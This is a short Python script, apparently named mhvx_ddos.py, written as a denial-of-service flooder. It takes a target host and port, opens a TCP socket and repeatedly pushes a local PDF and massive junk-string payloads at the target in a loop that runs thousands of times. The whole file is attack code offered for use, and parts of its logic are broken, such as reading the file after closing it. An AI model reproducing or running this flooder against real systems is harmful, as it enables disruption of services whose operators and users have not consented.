import socket
import optparse
import time
from clint.textui import colored

parser = optparse.OptionParser("""
                                                                          
          ,--.                                  ,--.   ,--.               
,--,--,--.|  ,---.,--.  ,--.,--.  ,--.,-----. ,-|  | ,-|  | ,---.  ,---.  
|        ||  .-.  |\  `'  /  \  `'  / '-----'' .-. |' .-. || .-. |(  .-'  
|  |  |  ||  | |  | \    /   /  /.  \        \ `-' |\ `-' |' '-' '.-'  `) 
`--`--`--'`--' `--'  `--'   '--'  '--'        `---'  `---'  `---' `----'  
                                                                          
    mhvx_ddos.py options:
            -t or --target >> To Set A Target Host
            -p or --port  >> To Set A Port Target
""")
parser.add_option("-t", "--target", dest="target", type="string", help="Enter Youre Target Host Or Domain Or IP")
parser.add_option("-p", "--port", dest="port", type="string", help="Enter Youre Port")
(options, args) = parser.parse_args()
if(options.target == None and options.port == None):
    print(parser.usage)
    exit(0)

else:
    print(colored.red(time.ctime()))
    def main():
        target = options.target
        port = int(options.port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        a = 0
        d = 10
        f = 15
        h = 120
        openfile = open("1.pdf", "rb")
        while a < h:
            a = a + 1 * f * d * h 
            array = ["anfjanjfnajfn;anf@#@!$$$@(#$@#$@(&!@(@*)$!$@!$!@!!~@!#@!#@!#@$#$#!@@!"]
            array = array * a * a
            while openfile:
                blocksize = 5000
                s.send(openfile.read(blocksize))
                print(colored.green("[Bit is Sent]"))
            openfile.close()
            for i in array:
                i = str(i).encode("utf-8")
                print(i)
                s.send(i)
                print(colored.green("\n [ SENT ]"))

for i in range(1000):
    main()
    main()
    main()
print(colored.red(time.ctime()))
